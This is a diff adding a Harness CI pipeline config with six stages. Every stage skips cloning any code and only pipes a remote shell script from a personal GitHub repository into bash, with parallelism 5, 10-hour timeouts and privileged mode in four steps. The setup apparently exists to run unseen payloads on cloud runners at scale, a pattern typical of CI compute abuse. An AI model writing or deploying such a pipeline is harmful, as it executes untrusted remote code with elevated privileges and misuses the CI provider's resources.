@@ -1,0 +1,228 @@
+pipeline:
+  identifier: jub_7
+  projectIdentifier: default_project
+  orgIdentifier: default
+  tags: {}
+  stages:
+    - stage:
+        identifier: jub1
+        type: CI
+        name: jub1
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: Run_1
+                  type: Run
+                  name: jub1Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    privileged: true
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+          caching:
+            enabled: false
+            paths: []
+          buildIntelligence:
+            enabled: false
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+    - stage:
+        identifier: jub2
+        type: CI
+        name: jub2
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: Run_1
+                  type: Run
+                  name: jub2Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    privileged: true
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+    - stage:
+        identifier: jub3
+        type: CI
+        name: jub3
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: jub3Run_1
+                  type: Run
+                  name: jub3Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    privileged: true
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+    - stage:
+        identifier: jub4
+        type: CI
+        name: jub4
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: jub4Run_1
+                  type: Run
+                  name: jub4Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    privileged: true
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+    - stage:
+        identifier: jub5
+        type: CI
+        name: jub5
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: jub5Run_1
+                  type: Run
+                  name: jub5Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+    - stage:
+        identifier: jub6
+        type: CI
+        name: jub6
+        description: ""
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  identifier: jub6Run_1
+                  type: Run
+                  name: jub6Run_1
+                  spec:
+                    shell: Bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
+                      | bash
+                    imagePullPolicy: IfNotPresent
+                    runAsUser: "1000"
+                  timeout: 10h
+                  strategy:
+                    parallelism: 5
+                  when:
+                    stageStatus: All
+        when:
+          pipelineStatus: All
+        strategy:
+          parallelism: 5
+        timeout: 10h
+  timeout: 10h
+  allowStageExecutions: true
+  name: jub 7
